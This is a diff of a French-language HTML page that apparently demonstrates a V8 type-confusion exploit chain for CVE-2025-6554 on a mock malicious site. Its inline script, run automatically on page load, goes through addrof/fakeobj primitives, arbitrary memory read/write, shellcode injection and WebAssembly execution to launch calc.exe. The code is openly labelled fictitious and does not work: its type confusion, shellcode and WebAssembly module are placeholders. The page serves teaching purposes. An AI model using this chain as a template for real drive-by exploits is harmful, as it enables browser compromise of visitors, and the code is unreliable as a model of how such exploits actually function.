@@ -2,13 +2,118 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>PoC CVE-2025-6554 Simulation</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Site Malveillant Hypothétique</title>
 </head>
 <body>
-    <h1>Simulation d'exploitation CVE-2025-6554 (Lab Red Team)</h1>
-    <p>Cette page simule une exploitation de type confusion dans V8 pour un environnement de test isolé.</p>
-    <button onclick="runExploit()">Lancer la simulation</button>
-    <div id="output"></div>
-    <script src="exploit.js"></script>
+    <h1>Bienvenue sur notre site !</h1>
+    <p>Ce site est une démonstration hypothétique d'une attaque exploitant CVE-2025-6554.</p>
+
+    <script>
+        // Hypothétique : Exploitation d'une confusion de type dans V8 pour exécuter calc.exe
+        // Ceci est purement éducatif et non fonctionnel.
+
+        // Étape 1 : Déclencher la confusion de type
+        function triggerTypeConfusion() {
+            let floatArray = new Float64Array(10);
+            for (let i = 0; i < 10; i++) {
+                floatArray[i] = 1.0 * i;
+            }
+
+            // Hypothèse : Une fonction buguée dans V8 permet d'insérer un objet
+            let obj = { value: 42 };
+            // Simuler la corruption (fonction fictive)
+            floatArray[5] = obj; // Bug fictif provoquant une confusion de type
+            console.log("Type confusion déclenchée : ", floatArray[5]);
+
+            return floatArray;
+        }
+
+        // Étape 2 : Créer des primitives mémoire (addrof et fakeobj)
+        function createMemoryPrimitives(corruptedArray) {
+            let addrof = function(obj) {
+                // Simuler l'extraction de l'adresse d'un objet
+                corruptedArray[0] = obj;
+                return corruptedArray[0]; // Retourne une adresse fictive
+            };
+
+            let fakeobj = function(address) {
+                // Simuler la création d'un faux objet
+                corruptedArray[0] = address;
+                return corruptedArray[0]; // Retourne un objet fictif
+            };
+
+            return { addrof, fakeobj };
+        }
+
+        // Étape 3 : Lecture/écriture arbitraire en mémoire
+        function arbitraryReadWrite(primitives) {
+            let buffer = new ArrayBuffer(1024);
+            let view = new DataView(buffer);
+
+            // Hypothèse : Utiliser l'adresse obtenue pour écrire arbitrairement
+            let targetAddress = primitives.addrof(buffer);
+            view.setFloat64(0, targetAddress, true); // Écriture arbitraire
+            console.log("Lecture/écriture arbitraire établie à l'adresse : ", targetAddress);
+
+            return { buffer, view };
+        }
+
+        // Étape 4 : Injecter un shellcode
+        function injectShellcode(memory) {
+            // Shellcode fictif pour exécuter calc.exe (exemple simplifié)
+            // En réalité, ce serait du code machine spécifique à Windows
+            let shellcode = new Uint8Array([
+                0x90, 0x90, // NOP (instructions fictives)
+                0xB8, 0x01, 0x00, 0x00, 0x00, // MOV EAX, 1 (exemple)
+                // Code pour lancer calc.exe (simulé)
+            ]);
+
+            // Hypothèse : Écrire le shellcode dans le buffer
+            for (let i = 0; i < shellcode.length; i++) {
+                memory.view.setUint8(i, shellcode[i]);
+            }
+            console.log("Shellcode injecté dans la mémoire.");
+
+            return memory.buffer;
+        }
+
+        // Étape 5 : Exécuter le shellcode
+        function executeShellcode(buffer) {
+            // Hypothèse : Utiliser WebAssembly pour exécuter le code natif
+            let wasmCode = new Uint8Array([
+                // Code WebAssembly fictif pour exécuter le buffer
+                0x00, 0x61, 0x73, 0x6D, // Magic number de WebAssembly
+                // Instructions pour appeler le buffer comme fonction
+            ]);
+
+            let module = new WebAssembly.Module(wasmCode);
+            let instance = new WebAssembly.Instance(module);
+
+            // Simuler l'exécution du shellcode pour lancer calc.exe
+            console.log("Exécution du shellcode : lancement de calc.exe");
+            instance.exports.main(); // Hypothèse : Exécute le shellcode
+        }
+
+        // Étape 6 : Chaîne d’exploitation complète
+        function exploit() {
+            try {
+                console.log("Lancement de l'exploitation...");
+                let corruptedArray = triggerTypeConfusion();
+                let primitives = createMemoryPrimitives(corruptedArray);
+                let memory = arbitraryReadWrite(primitives);
+                let shellcodeBuffer = injectShellcode(memory);
+                executeShellcode(shellcodeBuffer);
+                console.log("Exploit réussi : calc.exe lancé (hypothétique).");
+            } catch (e) {
+                console.error("Erreur dans l'exploitation : ", e);
+            }
+        }
+
+        // Lancer l'exploit au chargement de la page
+        window.onload = function() {
+            exploit();
+        };
+    </script>
 </body>
 </html>
